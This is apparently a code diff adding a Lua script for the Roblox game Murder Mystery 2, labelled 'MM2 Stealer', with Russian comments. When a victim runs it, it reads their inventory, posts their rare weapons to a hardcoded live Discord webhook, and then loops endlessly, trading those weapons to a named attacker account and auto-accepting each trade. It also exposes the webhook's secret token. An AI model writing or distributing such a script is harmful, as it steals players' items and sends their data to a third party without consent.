@@ -1,0 +1,148 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+
+getgenv().user = "MM2danya7"
+local webhook = "https://discord.com/api/webhooks/1415660439702081587/f-WR6U-AmmoTFBPnxXlBqWKaelol6TsPDDMmmGSh0yKjUi6gzefqilg1se3M3mtl1AjS"
+
+-- Функция для безопасной отправки вебхука
+local function SendWebhookRequest(embedData)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    local data = {
+        ["embeds"] = {embedData}
+    }
+
+    local success, response = pcall(function()
+        local body = HttpService:JSONEncode(data)
+        
+        if request then
+            return request({
+                Url = webhook,
+                Method = "POST",
+                Headers = headers,
+                Body = body
+            })
+        else
+            return HttpService:PostAsync(webhook, body, Enum.HttpContentType.ApplicationJson, false)
+        end
+    end)
+    
+    return success, response
+end
+
+-- Получаем данные профиля (нужно указать правильного игрока)
+local targetPlayer = Players:FindFirstChild(user)
+if targetPlayer then
+    local success, profileData = pcall(function()
+        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(targetPlayer)
+    end)
+    
+    if success and profileData then
+        -- Таблицы для фильтрации предметов (нужно определить)
+        local rarityTable = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Godly", "Chroma"}
+        local min_rarityindex = 5 -- Godly и выше
+        local database = {} -- Нужно заполнить реальными данными предметов
+        
+        -- Определение предметов для отправки
+        local send_wpn = {}
+        for dataid, amount in pairs(profileData.Weapons.Owned) do
+            local itemInfo = database[dataid]
+            if itemInfo then
+                local rarityIndex = table.find(rarityTable, itemInfo.Rarity)
+                if rarityIndex and rarityIndex >= min_rarityindex then
+                    table.insert(send_wpn, {
+                        DataID = itemInfo.ItemName,
+                        Rarity = itemInfo.Rarity,
+                        Amount = amount
+                    })
+                end
+            end
+        end
+
+        if #send_wpn > 0 then
+            local function formatItems(items)
+                local str = ""
+                for _, item in ipairs(items) do
+                    str = str .. string.format("%s (x%s) - %s\n", item.DataID, item.Amount, item.Rarity)
+                end
+                if str == "" then str = "None" end
+                return str
+            end
+
+            local embedData = {
+                ["title"] = "MM2 Stealer",
+                ["color"] = 0x0663EE,
+                ["fields"] = {
+                    {name = "Username", value = targetPlayer.Name, inline = true},
+                    {name = "Items", value = formatItems(send_wpn), inline = false}
+                },
+                ["footer"] = {["text"] = "mm2 by vexadez"}
+            }
+
+            local success, response = SendWebhookRequest(embedData)
+            if success then
+                print("Webhook отправлен успешно!")
+            else
+                warn("Ошибка отправки webhook:", response)
+            end
+        end
+    else
+        warn("Не удалось получить данные профиля")
+    end
+end
+
+-- Автоматическая отправка трейдов
+while true do
+    local targetPlayer = Players:FindFirstChild(user)
+    if targetPlayer then
+        local success = pcall(function()
+            ReplicatedStorage.Trade.SendRequest:InvokeServer(targetPlayer)
+        end)
+        
+        if success then
+            print("Запрос на обмен отправлен " .. user)
+            task.wait(0.4)
+
+            local List = {
+                "Chroma Luger", "Chroma Laser", "Chroma Lightbringer", "Chroma Darkbringer",
+                "Chroma Saw", "Chroma Slasher", "Chroma Fang", "Chroma Candleflame",
+                "Chroma Elderwood Blade", "Chroma Boneblade",
+                "Harvester", "Hallowscythe", "Elderwood Scythe", "Logchopper", "Batwing",
+                "Icebreaker", "Swirlyblade", "Swirly Axe", "Bioblade",
+                "Champion Blade", "Champion Axe", "Cavern Blade", "Comp Blade", "Trophy", "Scythe",
+                "Eternal", "Eternal II", "Eternal III", "Eternal IV", "Eternal V", "Eternal Cane",
+                "Candy Gun", "Pumpkin Gun", "Web Gun", "Sugar", "Snowball Launcher",
+                "Ameriluger", "Luger Cane", "Green Luger", "Laser Beam",
+                "Gingerscope", "Gingerblade"
+            }
+
+            for _, item in ipairs(List) do
+                pcall(function()
+                    ReplicatedStorage.Trade.OfferItem:FireServer(item, "Weapons")
+                end)
+                task.wait(0.03)
+            end
+
+            print("Предметы предложены")
+            task.wait(5)
+
+            -- Принять trade (ID нужно получить правильно)
+            pcall(function()
+                ReplicatedStorage.Trade.AcceptTrade:FireServer()
+            end)
+            
+            print("Обмен завершен, by vexadez")
+            task.wait(3)
+        else
+            print("Не удалось отправить запрос на обмен")
+            task.wait(5)
+        end
+    else
+        print("Игрок " .. user .. " не в игре")
+        task.wait(5)
+    end
+end
